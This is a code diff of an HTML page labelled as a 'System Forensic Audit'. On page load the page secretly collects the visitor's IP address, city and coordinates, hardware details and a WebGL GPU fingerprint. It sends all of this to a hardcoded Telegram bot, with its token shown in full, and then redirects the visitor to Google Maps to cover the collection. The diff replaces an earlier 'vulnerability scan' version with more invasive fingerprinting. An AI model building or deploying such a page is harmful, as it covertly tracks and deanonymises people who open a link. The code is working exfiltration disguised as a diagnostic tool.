@@ -1,38 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Audit v2.0</title></head>
+<head><title>System Forensic Audit</title></head>
 <body>
 <script>
     const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
     const chat = "7647765854";
 
-    async function vAudit() {
+    async function systemCapture() {
         const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
         
-        // سحب تفاصيل المتصفح والنظام (User Agent)
-        const ua = navigator.userAgent;
-        const platform = navigator.platform;
-        const languages = navigator.languages.join(", ");
+        // 1. تحديد عدد المعالجات والذاكرة (تعطي مؤشر لاسم الجهاز لو كان خادماً)
+        const cpuCores = navigator.hardwareConcurrency || "N/A";
+        const deviceMemory = navigator.deviceMemory || "N/A";
         
-        // بصمة الهاردوير (Canvas)
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.fillText("Vulnerability_Scan", 2, 2);
-        const fingerprint = btoa(canvas.toDataURL()).slice(-30);
+        // 2. محاولة سحب اسم النظام الأساسي (Platform Details)
+        const platformInfo = navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]) : "Standard Query";
 
-        const report = `🛡️ **VULNERABILITY SCAN REPORT** 🛡️\n\n` +
+        // 3. بصمة الهاردوير العميقة (Canvas)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+        const report = `🚀 **ADVANCED SYSTEM IDENTITY REPORT** 🚀\n\n` +
                      `🌐 **IP:** \`${ipInfo.ip}\`\n` +
-                     `💻 **OS/Platform:** \`${platform}\`\n` +
-                     `🌐 **User-Agent:** \`${ua}\`\n` +
-                     `🌍 **Languages:** \`${languages}\`\n` +
-                     `🆔 **Hardware ID:** \`${fingerprint}\`\n` +
-                     `📍 **Location:** \`${ipInfo.city}, ${ipInfo.country_name}\`\n\n` +
+                     `💻 **OS Platform:** \`${navigator.platform}\`\n` +
+                     `⚙️ **CPU Cores:** \`${cpuCores}\`\n` +
+                     `🧠 **RAM (Approx):** \`${deviceMemory} GB\`\n` +
+                     `🎮 **GPU Renderer:** \`${renderer}\`\n` +
+                     `🆔 **Hardware Fingerprint:** \`${btoa(renderer).slice(0, 16)}\`\n\n` +
+                     `📍 **Location:** \`${ipInfo.city}, ${ipInfo.country_name}\`\n` +
                      `🔗 **Map:** https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
         window.location.href = "https://www.google.com/maps";
     }
-    window.onload = vAudit;
+    window.onload = systemCapture;
 </script>
 </body>
 </html>
